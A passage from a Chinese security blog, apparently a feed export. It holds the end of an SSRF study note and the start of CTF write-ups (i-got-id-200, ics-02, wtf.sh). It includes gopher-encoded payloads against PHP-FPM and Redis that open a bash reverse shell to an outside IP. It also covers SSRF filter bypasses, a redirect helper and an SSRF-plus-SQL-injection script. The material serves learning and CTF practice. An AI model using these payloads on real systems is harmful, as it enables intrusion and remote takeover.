首先根据faci_exp生成exp，随后改成支持gopher协议的URL</p><pre><code>gopher://127.0.0.1:9000/_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%10%00%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%02CONTENT_LENGTH97%0E%04REQUEST_METHODPOST%09%5BPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Asafe_mode%20%3D%20Off%0Aauto_prepend_file%20%3D%20php%3A//input%0F%13SCRIPT_FILENAME/var/www/html/1.php%0D%01DOCUMENT_ROOT/%01%04%00%01%00%00%00%00%01%05%00%01%00a%07%00%3C%3Fphp%20system%28%27bash%20-i%20%3E%26%20/dev/tcp/172.19.23.228/2333%200%3E%261%27%29%3Bdie%28%27-----0vcdb34oju09b8fd-----%0A%27%29%3B%3F%3E%00%00%00%00%00%00%00</code></pre><p>本地监听2333端口  接收反弹shell</p><p>利用gopher协议存在的问题(参考资料3)</p><ol><li>PHP的curl默认不跟随302跳转</li><li>curl7.43上gopher协议存在%00截断的BUG，v7.49可用</li><li>file_get_contents()的SSRF，gopher协议不能使用URLencode</li><li>file_get_contents()的SSRF，gopher协议的302跳转有BUG会导致利用失败</li></ol><h1 id="0x04-bypass"><a href="#0x04-bypass" class="headerlink" title="0x04    bypass"></a>0x04    bypass</h1><p><strong>1)更改IP地址写法</strong>(在上一篇笔记中,有总结过IP地址的不同形式,但效果是一样的),如: 192.168.0.1</p><ul><li>8进制格式: 300.</li><li>16进制格式: 0xc0.0xa8.0.1</li><li>10进制整数格式: 3232235521</li><li>16进制整数格式: 0xC0A80001</li><li>特殊的省略模式: 列入<code>10.0.0.1</code>可写为<code>10.1</code></li></ul><p><strong>2)利用URL解析问题</strong>,在某些情况下,后端程序可能会对访问的URL进行解析,对解析出来的HOST地址进行过滤.如果URL参数解析不当,可能绕过过滤</p><ul><li><code>http://www.baidu.com@192.168.0.1/</code>与<code>http://192.168.0.1</code>请求的都是<code>192.168.0.1</code>的内容</li></ul><p>解释:  后端程序通过不正确的正则表达式（比如将http之后到com为止的字符内容，也就是<a href="http://www.baidu.com" target="_blank" rel="noopener">www.baidu.com</a>，认为是访问请求的host地址时）对上述URL的内容进行解析的时候，很有可能会认为访问URL的host为<a href="http://www.baidu.com" target="_blank" rel="noopener">www.baidu.com</a>，而实际上这个URL所请求的内容都是192.168.0.1上的内容。</p><ul><li><p>可以指向任意 ip 的域名<code>xip.io</code>：<code>http://127.0.0.1.xip.io/</code>==&gt;<code>http://127.0.0.1/</code></p></li><li><p>短地址<code>http://dwz.cn/11SMa</code>==&gt;<code>http://127.0.0.1</code></p></li><li><p>利用句号<code>。</code>：<code>127。0。0。1</code>==&gt;<code>127.0.0.1</code></p></li><li><p>利用 Enclosed alphanumerics</p><pre><code>ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ  &gt;&gt;&gt;  example.comList:① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ ⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇ ⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛ ⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵ Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ ⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ ⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿</code></pre></li></ul><p>这个就比较tql了…</p><p><strong>3)利用302跳转</strong></p><p>前提是服务器要允许30x跳转</p><p>如果后端服务器在接收到参数后，正确的解析了URL的host，并且进行了过滤，我们这个时候可以使用302跳转的方式来进行绕过。</p><p>百度短网址服务,要钱的并且不支持ip形式<a href="https://dwz.cn/" target="_blank" rel="noopener">https://dwz.cn/</a></p><p>这个支持,并且感觉很不错 <a href="http://a.topurl.cn/#/" target="_blank" rel="noopener">http://a.topurl.cn/#/</a></p><p>(1)、在网络上存在一个很神奇的服务，<a href="http://xip.io" target="_blank" rel="noopener">http://xip.io</a> 当我们访问这个网站的子域名的时候，例如192.168.0.1.xip.io，就会自动重定向到192.168.0.1。</p><p>(2)、由于上述方法中包含了192.168.0.1这种内网IP地址，可能会被正则表达式过滤掉，我们可以通过短地址的方式来绕过。经过测试发现新浪，百度的短地址服务并不支持IP模式，所以这里使用的是<a href="http://a.topurl.cn/#/所提供的短地址服务" target="_blank" rel="noopener">http://a.topurl.cn/#/所提供的短地址服务</a>.</p><p>这里提一下302跳转和307跳转的区别,307跳转回转发POST请求中的 数据等,但是302跳转不会.</p><p><strong>4)通过各种非HTTP协议</strong></p><p>如果服务器端程序对访问URL所采用的协议进行验证的话，可以通过非HTTP协议来进行利用。</p><p>(1)、GOPHER协议：通过GOPHER我们在一个URL参数中构造Post或者Get请求，从而达到攻击内网应用的目的。例如我们可以使用GOPHER协议对与内网的Redis服务进行攻击，可以使用如下的URL：</p><pre><code>gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*/1* * * * bash -i &gt;&amp; /dev/tcp/172.19.23.228/23330&gt;&amp;1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a</code></pre><p>(2)、File协议：File协议主要用于访问本地计算机中的文件，我们可以通过类似file:///文件路径这种格式来访问计算机本地文件。使用file协议可以避免服务端程序对于所访问的IP进行的过滤。例如我们可以通过file:///d:/1.txt 来访问D盘中1.txt的内容</p><p><strong>5)DNS  Rebinding</strong></p><p>DNS重绑定</p><p><img src="https://image.3001.net/images/20170515/14948315084608.png!small" alt></p><p>对于用户请求的URL参数，首先服务器端会对其进行DNS解析，然后对于DNS服务器返回的IP地址进行判断，如果在黑名单中，就pass掉。</p><p>但是在整个过程中，<strong>第一次去请求DNS服务进行域名解析到第二次服务端去请求URL之间存在一个时间查，利用这个时间差，我们可以进行DNS 重绑定攻击</strong>。</p><p>要完成DNS重绑定攻击，我们需要一个域名，并且将这个<strong>域名的解析指定到我们自己的DNS Server</strong>，在我们的<strong>可控的DNS Server上编写解析服务，设置TTL时间为0</strong>。这样就可以进行攻击了，完整的攻击流程为：</p><blockquote><p>(1)、服务器端获得URL参数，进行第一次DNS解析，获得了一个非内网的IP</p><p>(2)、对于获得的IP进行判断，发现为非黑名单IP，则通过验证</p><p>(3)、服务器端对于URL进行访问，由于DNS服务器设置的TTL为0，所以再次进行DNS解析，这一次DNS服务器返回的是内网地址。</p><p>(4)、由于已经绕过验证，所以服务器端返回访问内网资源的结果。</p></blockquote><p><strong>6)其他绕过</strong></p><p>利用[::]绕过localhost</p><p>一个好的黑客就是要不断的bypass…</p><p>利用@</p><p><a href="http://example.com@127.0.0.1" target="_blank" rel="noopener">http://example.com@127.0.0.1</a></p><p>利于中文句号</p><p>127。0。0。1</p><p><strong>7)绕过parse_url()</strong></p><p>参考 <a href="https://www.anquanke.com/post/id/101058?from=singlemessage" target="_blank" rel="noopener">https://www.anquanke.com/post/id/101058?from=singlemessage</a></p><p><a href="https://skysec.top/2018/03/15/Some%20trick%20in%20ssrf%20and%20unserialize()/#trick1-filter-var-bypass" target="_blank" rel="noopener">https://skysec.top/2018/03/15/Some%20trick%20in%20ssrf%20and%20unserialize()/#trick1-filter-var-bypass</a></p><p>原理: </p><blockquote><p><strong>parse_url与libcurl对curl的解析差异</strong></p></blockquote><pre><code>php 7.0libcurl 7.52</code></pre><p>匹配规则</p><pre><code>php parse_url：host: 匹配最后一个@后面符合格式的hostlibcurl：host：匹配第一个@后面符合格式的host</code></pre><p>比如如下url：</p><pre><code>http://u:p@a.com:80@b.com/</code></pre><p>php解析结果：</p><pre><code>schema: http host: b.comuser: upass: p@a.com:80</code></pre><p>而libcurl解析结果：</p><pre><code>schema: httphost: a.comuser: upass: pport: 80后面的@b.com/会被忽略掉</code></pre><p>那么此时，如果恶意代码检测是依据parse_url的结果，就会导致绕过问题<br>我们假设一个环境：<br>1.利用curl对用户给出ip进行访问并获取内容<br>2.为防止ssrf，我们利用parse_url进行解析，设置waf<br>那么就以刚才的url为例：<code>http://u:p@a.com:80@b.com/</code><br>如果我们的后端代码用parse_url()去解析我们传入的url，并只允许访问Host为b.com的ip<br>而此时如果我们传入的是刚才的url，那么我们可以绕过解析，并且curl访问到非法ip</p><h1 id="0x05-漏洞挖掘"><a href="#0x05-漏洞挖掘" class="headerlink" title="0x05    漏洞挖掘"></a>0x05    漏洞挖掘</h1><p><strong>1)Googlehacking</strong></p><ul><li>inurl:?apiurl=</li><li>inurl:?url=</li><li>inurl:?image=http://  ?image=https://</li><li>site:fanyi.*.com</li><li>inurl:?site=</li></ul><p><strong>2)二级域名搜集</strong></p><p><strong>3)上面写的漏洞出现场景</strong></p><h1 id="0x06-漏洞防御"><a href="#0x06-漏洞防御" class="headerlink" title="0x06    漏洞防御"></a>0x06    漏洞防御</h1><ul><li>限制协议为HTTP/HTTPS</li><li>禁止30X跳转</li><li>设置URL白名单或者限制内网IP(使用gethostbyname()判断是否为内网IP</li><li>服务端开启OpenSSL无法交互利用</li><li>服务端需要认证交互</li><li>把用于取外网资源的API部署在不属于自己的机房</li><li>过滤返回信息,验证远程服务器对请求的响应是比较容易的方法。如果web应用是去获取某一种类型的文件。那么在把返回结果展示给用户之前先验证返回的信息是否符合标准。</li><li>限制请求的端口为http常用的端口，比如 80、443、8080、8090</li><li>统一错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态。</li></ul><h1 id="0x07-总结"><a href="#0x07-总结" class="headerlink" title="0x07    总结"></a>0x07    总结</h1><p>跳转exp</p><ol><li><pre class=" language-PHP"><code class="language-PHP"><?php$ip = $_GET['ip'];$port = $_GET['port'];$scheme = $_GET['s'];$data = $_GET['data'];header("Location: $scheme://$ip:$port/$data");?></code></pre></li><li><p>常见的网络协议的知识还需要补充.比如什么端口对应什么服务</p></li></ol><p>比如,内网地址是ipv4地址协议中预留的分别是</p><ul><li>10.0.0.0–10.255.255.255</li><li>172.16.0.0–172.31.255.255 </li><li>192.168.0.0–192.168.255.255</li></ul><p>原文網址：<a href="https://kknews.cc/news/2kojba9.html" target="_blank" rel="noopener">https://kknews.cc/news/2kojba9.html</a></p><h1 id="0x08-参考资料"><a href="#0x08-参考资料" class="headerlink" title="0x08    参考资料"></a>0x08    参考资料</h1><ol><li><a href="https://ctf-wiki.github.io/ctf-wiki/web/ssrf-zh/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/web/ssrf-zh/</a></li><li><a href="https://3wapp.github.io/WebSecurity/常见协议.html" target="_blank" rel="noopener">https://3wapp.github.io/WebSecurity/%E5%B8%B8%E8%A7%81%E5%8D%8F%E8%AE%AE.html</a></li><li><a href="https://www.anquanke.com/post/id/145519" target="_blank" rel="noopener">https://www.anquanke.com/post/id/145519</a></li><li><a href="https://www.sadk.org/日志/1795.html" target="_blank" rel="noopener">https://www.sadk.org/%E6%97%A5%E5%BF%97/1795.html</a></li><li><a href="https://xz.aliyun.com/t/5665" target="_blank" rel="noopener">https://xz.aliyun.com/t/5665</a></li><li><a href="https://github.com/iamultra/ssrfsocks" target="_blank" rel="noopener">https://github.com/iamultra/ssrfsocks</a></li><li><a href="https://joychou.org/web/phpssrf.html" target="_blank" rel="noopener">https://joychou.org/web/phpssrf.html</a></li><li>https://_thorns.gitbooks.io/sec/content/bilibilimou_fen_zhan_cong_xin_xi_xie_lu_dao_ssrf_z.html</li><li><a href="https://www.freebuf.com/articles/web/135342.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/135342.html</a></li><li><a href="http://blog.leanote.com/post/snowming/b42f5d7ab396" target="_blank" rel="noopener">http://blog.leanote.com/post/snowming/b42f5d7ab396</a>   有乌云的文章,好好学习吧</li><li><a href="http://blog.leanote.com/post/snowming/b654d901ff8a" target="_blank" rel="noopener">http://blog.leanote.com/post/snowming/b654d901ff8a</a></li><li><a href="https://paper.seebug.org/393/" target="_blank" rel="noopener">https://paper.seebug.org/393/</a></li><li><a href="https://docs.google.com/document/d/1v1TkWZtrhzRLy0bYXBcdLUedXGb9njTNIJXa3u9akHM/edit" target="_blank" rel="noopener">SSRF圣经</a></li><li><a href="https://blog.chaitin.cn/gopher-attack-surfaces/" target="_blank" rel="noopener">利用Gopher协议拓展攻击面</a></li><li><a href="http://blog.safebuff.com/2016/07/03/SSRF-Tips/" target="_blank" rel="noopener">http://blog.safebuff.com/2016/07/03/SSRF-Tips/</a>  总结了对应不同app的不同exp还有一些函数知识</li><li><a href="https://kknews.cc/news/2kojba9.html" target="_blank" rel="noopener">实战篇丨聊一聊SSRF漏洞的挖掘思路与技巧</a></li><li><a href="https://www.freebuf.com/column/157466.html" target="_blank" rel="noopener">https://www.freebuf.com/column/157466.html</a></li></ol><p>其实网上关于SSRF的资料多的很,我也就根据了几篇感觉写的比较好的来总结的.更多的其实需要在懂了原理之后的实际操作.</p><p>后续补充把~</p>]]></content>
      
      
      <categories>
          
          <category> TOP10基础漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SSRF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界上比较有意思的题目题解</title>
      <link href="/posts/20200118/"/>
      <url>/posts/20200118/</url>
      
        <content type="html"><![CDATA[<h1 id="i-got-id-200"><a href="#i-got-id-200" class="headerlink" title="i-got-id-200"></a>i-got-id-200</h1><p>知识点</p><ul><li>Perl语言漏洞</li><li>来源于Blackhat???</li></ul><p><a href="https://www.blackhat.com/docs/asia-16/materials/asia-16-Rubin-The-Perl-Jam-2-The-Camel-Strikes-Back.pdf" target="_blank" rel="noopener">https://www.blackhat.com/docs/asia-16/materials/asia-16-Rubin-The-Perl-Jam-2-The-Camel-Strikes-Back.pdf</a></p><p>下面是ppt里面的截图</p><p><img src="https://i.loli.net/2020/01/18/Un9P4mTwE1QDiqr.png" alt></p><p><img src="https://i.loli.net/2020/01/18/zED9YfSca2V4K7I.png" alt></p><p>打开题目有</p><ul><li>hello world , 告诉我们这道题是Perl语言的漏洞</li><li>cig(猜测可能存在Perl cgi相关的漏洞)</li><li>上传文件(可能存在与文件上传先关的漏洞….but)</li></ul><p>看了许多带佬的文章,都是直接猜测出来perl的源码</p><pre class=" language-perl"><code class="language-perl"><span class="token keyword">use</span> strict<span class="token punctuation">;</span> <span class="token keyword">use</span> warnings<span class="token punctuation">;</span> <span class="token keyword">use</span> CGI<span class="token punctuation">;</span><span class="token keyword">my</span> <span class="token variable">$cgi</span><span class="token operator">=</span> CGI<span class="token operator">-></span>new<span class="token punctuation">;</span> <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token variable">$cgi</span><span class="token operator">-></span>upload<span class="token punctuation">(</span> <span class="token string">'file'</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token keyword">my</span> <span class="token variable">$file</span><span class="token operator">=</span> <span class="token variable">$cgi</span><span class="token operator">-></span>param<span class="token punctuation">(</span><span class="token string">'file'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token operator">&lt;</span><span class="token variable">$file</span><span class="token operator">></span> <span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token keyword">print</span> <span class="token string">"$_"</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token punctuation">}</span> </code></pre><p>然后上传了一个 <code>ARGV</code> 实现了 <code>任意文件读取</code></p><p>原理是这样的</p><p><code>param()</code>函数会返回 <strong>一个列表的文件</strong> 但是 <strong>只有第一个文件会被放入到下面的file变量中</strong>。如果我们传入一个<code>ARGV</code>的文件，那么Perl会将传入的参数作为文件名读出来。</p><p>在正常的上传文件<strong>前面加上一个文件上传项ARGV</strong>，然后在URL中传入文件路径参数，可以实现读取任意文件读取</p><p>可以直接猜测存在flag这个文件,但是正常的思路是先列出当前又哪些文件,然后再来读取</p><p><img src="https://i.loli.net/2020/01/18/g45ihuVcEkdFzsP.png" alt></p><p>这里就是使用bash执行系统命令</p><p><img src="https://i.loli.net/2020/01/18/N29AEpqc61VCL7y.png" alt></p><p>通过管道的方式，执行任意命令，然后将其输出结果用管道传输到读入流中，这样就可以保证获取到flag文件的位置了。这里用到了${IFS}来作命令分割，原理是会将结果变成<code>bash -c &quot;ls/&quot;</code>的等价形式.</p><p><strong>总结：如果是perl写的网页并且遇到上传可配合ARGV文件使用造成任意文件读取，然后任意文件读取可利用bash执行一定的命令。</strong></p><p>具体是什么原理等我大概过了Perl看能不能解释吧,现在就先把怎么解决这类问题的做法学会.(太懒的借口</p><h1 id="ics-02"><a href="#ics-02" class="headerlink" title="ics-02"></a>ics-02</h1><ul><li>下载下的php文件打开后看到内容为pdf格式,修改为pdf格式,讲SSRF的文章</li><li>目录扫描,发现secert这个目录,点击进去存在两个页面</li></ul><p><img src="https://i.loli.net/2020/01/18/VNxXdg7epnF4Huo.png" alt></p><p><img src="https://i.loli.net/2020/01/18/zkeal2tHXLWp5xs.png" alt></p><p>访问<code>secret_debug.php</code> You (ip) do not have access to this page…</p><p>由此处说明极有可能存在SSRF然后来访问这个页面得到flag</p><p>访问<code>secret.php</code>是一个注册页面,我们输入的数据是进入了数据库中的,因此可能存在SQLi.果然,当输入 <code>1&#39; or 1=1</code> 时就会报错</p><p><img src="https://i.loli.net/2020/01/18/pSnkCbtD3BUReVh.png" alt></p><p><img src="https://i.loli.net/2020/01/18/X1K3uMFQpknxWD5.png" alt></p><p>因此利用点肯定是</p><ul><li>SSRF</li><li>SQLi</li></ul><p>EXP</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> random<span class="token keyword">import</span> urlliburl <span class="token operator">=</span> <span class="token string">'http://111.198.29.45:33406/download.php'</span><span class="token comment" spellcheck="true">#subquery = "database()" </span><span class="token comment" spellcheck="true">#subquery = "select table_name from information_schema.tables where table_schema='ssrfw' LIMIT 1" </span><span class="token comment" spellcheck="true">#subquery = "select column_name from information_schema.columns where table_name='cetcYssrf' LIMIT 1" </span><span class="token comment" spellcheck="true">#subquery = "select column_name from information_schema.columns where table_name='cetcYssrf' LIMIT 1 OFFSET 1" </span>subquery <span class="token operator">=</span> <span class="token string">"select value from cetcYssrf LIMIT 1"</span>dl <span class="token operator">=</span> <span class="token string">'%x'</span><span class="token operator">%</span>random<span class="token punctuation">.</span>getrandbits<span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">)</span>d <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">'http://127.0.0.1/secret/secret_debug.php?'</span> <span class="token operator">+</span>        urllib<span class="token punctuation">.</span>urlencode<span class="token punctuation">(</span><span class="token punctuation">{</span>             <span class="token string">"s"</span><span class="token punctuation">:</span><span class="token string">"3"</span><span class="token punctuation">,</span>             <span class="token string">"txtfirst_name"</span><span class="token punctuation">:</span><span class="token string">"A','b',("</span><span class="token operator">+</span>subquery<span class="token operator">+</span><span class="token string">"),'c'/*"</span><span class="token punctuation">,</span>             <span class="token string">"txtmiddle_name"</span><span class="token punctuation">:</span><span class="token string">"B"</span><span class="token punctuation">,</span>             <span class="token string">"txtname_suffix"</span><span class="token punctuation">:</span><span class="token string">"C"</span><span class="token punctuation">,</span>             <span class="token string">"txtLast_name"</span><span class="token punctuation">:</span><span class="token string">"D"</span><span class="token punctuation">,</span>             <span class="token string">"txtdob"</span><span class="token punctuation">:</span><span class="token string">"*/,'E"</span><span class="token punctuation">,</span>             <span class="token string">"txtdl_nmbr"</span><span class="token punctuation">:</span>dl<span class="token punctuation">,</span>             <span class="token string">"txtRetypeDL"</span><span class="token punctuation">:</span>dl            <span class="token punctuation">}</span><span class="token punctuation">)</span> <span class="token operator">+</span>        <span class="token string">"&amp;"</span><span class="token punctuation">)</span>r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span> params<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">"dl"</span><span class="token punctuation">:</span>d<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token keyword">print</span> r<span class="token punctuation">.</span>text<span class="token punctuation">;</span></code></pre><p>(学Python去了,233</p><h1 id="CSAW-CTF-Qualification-Round-2016-wtf-sh"><a href="#CSAW-CTF-Qualification-Round-2016-wtf-sh" class="headerlink" title="CSAW CTF Qualification Round 2016 wtf.sh"></a>CSAW CTF Qualification Round 2016 wtf.sh</h1><p>据说这道题是这个比赛中最难的一个Web题</p><p>复现环境: </p><p>Windows10+<a href="https://blog.cindemor.com/post/ctf-fairy-1.html" target="_blank" rel="noopener">writeup</a>+BurpSuite+Firefox</p><p>这道题分为两个flag</p><p>题目目的: </p><blockquote><p>了解相关漏洞,了解Bash代码审计</p></blockquote><p>参考资料: </p><p><a href="https://blog.cindemor.com/post/ctf-fairy-1.html" target="_blank" rel="noopener">https://blog.cindemor.com/post/ctf-fairy-1.html</a></p><h2 id="Flag1"><a href="#Flag1" class="headerlink" title="Flag1"></a>Flag1</h2><ul><li>目录穿越</li><li>cookies欺骗</li></ul><p>第一个flag比较容易拿到<code>如果知道了思路的话</code></p><p>随便点开一篇文章<code>http://111.198.29.45:50295/post.wtf?post=K8laH</code></p><p>观察到<code>?post=</code>猜测存在<strong>文件包含</strong>或者<strong>目录穿越</strong>.使用<code>http://111.198.29.45:50295/post.wtf?post=../</code>得到源码,审计源码发现</p><p><img src="https://i.loli.net/2020/01/22/kBrgKJ4MYC59IZe.png" alt></p><p>只要<code>username=admin,并且cookie也是admin的cooke</code>就能执行<code>$get_flag1</code>拿到第一个flag,于是下面就需要进行cookie欺骗.但是怎么去欺骗?首先需要得到admin的cookie啊,在源码中搜索<code>users</code>,可以看到有<code>users_lookup</code>和<code>users</code>和<code>get_users_posts</code>,从而知道存在users目录</p><p><code>?post=../users</code>得到admin的cookie,<code>右键查看源码得到tag</code></p><p><img src="https://i.loli.net/2020/01/22/G7ETPvNHDYkI58x.png" alt></p><p>Tips: </p><p>如果题目设置过滤掉<code>../</code>那么可以通过<code>..././</code>来进行绕过(备忘录</p><p>cookie欺骗不光只需要改cookie,有的时候关于这个用户的信息都要填上去</p><h2 id="Flag2"><a href="#Flag2" class="headerlink" title="Flag2"></a>Flag2</h2><ul><li>代码审计</li><li>后门利用</li></ul><p>在做题过程中,在response中一直在变化bash的提示,比如<code>X-Bash-Fact: Bash has an</code>until<code>keyword, which is equivalent to</code>while not<code>.</code></p><p>访问<code>http://111.198.29.45:50295/wtf.sh</code>得到linux脚本代码,也可以直接在之前源码泄露的地方进行代码审计</p><pre class=" language-bash"><code class="language-bash">max_page_include_depth<span class="token operator">=</span>64page_include_depth<span class="token operator">=</span>0<span class="token keyword">function</span> include_page <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true"># include_page pathname</span>    local pathname<span class="token operator">=</span><span class="token variable">$1</span>    local cmd<span class="token operator">=</span>    <span class="token punctuation">[</span><span class="token punctuation">[</span> <span class="token variable">${pathname(-4)}</span> <span class="token operator">=</span> <span class="token string">'.wtf'</span> <span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span> // 这就是为什么需要%09的原因    local can_execute<span class="token operator">=</span>$<span class="token punctuation">;</span>    page_include_depth<span class="token operator">=</span><span class="token variable"><span class="token variable">$((</span>$page_include_depth<span class="token operator">+</span><span class="token number">1</span><span class="token variable">))</span></span>    <span class="token keyword">if</span> <span class="token punctuation">[</span><span class="token punctuation">[</span> <span class="token variable">$page_include_depth</span> -lt <span class="token variable">$max_page_include_depth</span> <span class="token punctuation">]</span><span class="token punctuation">]</span>    <span class="token keyword">then</span>        local line<span class="token punctuation">;</span>        <span class="token keyword">while</span> <span class="token function">read</span> -r line<span class="token punctuation">;</span> <span class="token keyword">do</span>            <span class="token comment" spellcheck="true"># check if we're in a script line or not ($ at the beginning implies script line)</span>            <span class="token comment" spellcheck="true"># also, our extension needs to be .wtf</span>            <span class="token punctuation">[</span><span class="token punctuation">[</span> $ <span class="token operator">=</span> <span class="token variable">${line01}</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">${can_execute}</span> <span class="token operator">=</span> 0 <span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            is_script<span class="token operator">=</span>$<span class="token punctuation">;</span>            <span class="token comment" spellcheck="true"># execute the line.</span>            <span class="token keyword">if</span> <span class="token punctuation">[</span><span class="token punctuation">[</span> <span class="token variable">$is_script</span> <span class="token operator">=</span> 0 <span class="token punctuation">]</span><span class="token punctuation">]</span>            <span class="token keyword">then</span>                cmd+<span class="token operator">=</span>$<span class="token string">'n'</span>$<span class="token punctuation">{</span>line<span class="token comment" spellcheck="true">#$};</span>            <span class="token keyword">else</span>                <span class="token keyword">if</span> <span class="token punctuation">[</span><span class="token punctuation">[</span> -n <span class="token variable">$cmd</span> <span class="token punctuation">]</span><span class="token punctuation">]</span>                <span class="token keyword">then</span>                    <span class="token function">eval</span> <span class="token variable">$cmd</span>  log Error during execution of <span class="token variable">${cmd}</span><span class="token punctuation">;</span>                    cmd<span class="token operator">=</span>                <span class="token keyword">fi</span>                <span class="token keyword">echo</span> <span class="token variable">$line</span>            <span class="token keyword">fi</span>        <span class="token keyword">done</span>  <span class="token variable">${pathname}</span>    <span class="token keyword">else</span>        <span class="token keyword">echo</span> pMax include depth exceeded<span class="token operator">!</span>p    <span class="token keyword">fi</span><span class="token punctuation">}</span></code></pre><p>审计后发现可以执行wtf文件,此时如果能够上传wtf文件就可以getshell</p><p>继续审计代码</p><pre class=" language-bash"><code class="language-bash">    <span class="token keyword">function</span> reply <span class="token punctuation">{</span>        local post_id<span class="token operator">=</span><span class="token variable">$1</span><span class="token punctuation">;</span>        local username<span class="token operator">=</span><span class="token variable">$2</span><span class="token punctuation">;</span>        local text<span class="token operator">=</span><span class="token variable">$3</span><span class="token punctuation">;</span>        local hashed<span class="token operator">=</span><span class="token punctuation">$(</span>hash_username <span class="token string">"<span class="token variable">${username}</span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        curr_id<span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span><span class="token keyword">for</span> d <span class="token keyword">in</span> posts/$<span class="token punctuation">{</span>post_id<span class="token punctuation">}</span>/*<span class="token punctuation">;</span> <span class="token keyword">do</span> <span class="token function">basename</span> $d<span class="token punctuation">;</span> <span class="token keyword">done</span> <span class="token operator">|</span> <span class="token function">sort</span> -n <span class="token operator">|</span> <span class="token function">tail</span> -n 1<span class="token variable">)</span></span><span class="token punctuation">;</span>        next_reply_id<span class="token operator">=</span><span class="token punctuation">$(</span>awk <span class="token string">'{print <span class="token variable">$1</span>+1}'</span> <span class="token operator">&lt;&lt;&lt;</span> <span class="token string">"<span class="token variable">${curr_id}</span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        next_file<span class="token operator">=</span><span class="token punctuation">(</span>posts/<span class="token variable">${post_id}</span>/<span class="token variable">${next_reply_id}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string">"<span class="token variable">${username}</span>"</span> <span class="token operator">></span> <span class="token string">"<span class="token variable">${next_file}</span>"</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string">"RE: $(nth_line 2 &lt; "</span>posts/<span class="token variable">${post_id}</span>/1<span class="token string">")"</span> <span class="token operator">>></span> <span class="token string">"<span class="token variable">${next_file}</span>"</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string">"<span class="token variable">${text}</span>"</span> <span class="token operator">>></span> <span class="token string">"<span class="token variable">${next_file}</span>"</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true"># add post this is in reply to to posts cache</span>        <span class="token keyword">echo</span> <span class="token string">"<span class="token variable">${post_id}</span>/<span class="token variable">${next_reply_id}</span>"</span> <span class="token operator">>></span> <span class="token string">"users_lookup/<span class="token variable">${hashed}</span>/posts"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span></code></pre><p>其中<code>echo &quot;${username}&quot; &gt; &quot;${next_file}&quot;;</code> 